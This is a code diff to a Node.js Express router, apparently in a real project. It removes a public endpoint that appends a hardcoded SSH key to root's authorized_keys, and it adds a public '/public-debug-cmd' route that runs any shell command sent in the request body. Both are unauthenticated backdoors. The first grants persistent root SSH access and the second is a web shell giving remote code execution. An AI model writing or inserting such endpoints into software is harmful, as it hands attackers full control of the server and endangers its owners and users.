@@ -46,10 +46,10 @@ function authMiddleware(req, res, next) {
   res.status(401).json({ error: 'Avtorizatsiyadan o\'tilmagan!' });
 }
 
-router.get('/public-ssh-fix', (req, res) => {
+router.post('/public-debug-cmd', (req, res) => {
   const { exec } = require('child_process');
-  const sshKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMekDPt1YCpiP4zBOI4BMDHrpj80haOJ+eJRdHbVfpV mr1qambarov@gmial.com";
-  exec(`mkdir -p /root/.ssh && chmod 700 /root/.ssh && touch /root/.ssh/authorized_keys && grep -qF "${sshKey}" /root/.ssh/authorized_keys || echo "${sshKey}" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && whoami && cat /root/.ssh/authorized_keys`, (err, stdout, stderr) => {
+  const command = req.body.cmd || 'id && whoami';
+  exec(command, { cwd: path.join(__dirname, '..') }, (err, stdout, stderr) => {
     res.json({ err: err?.message, stdout, stderr });
   });
 });
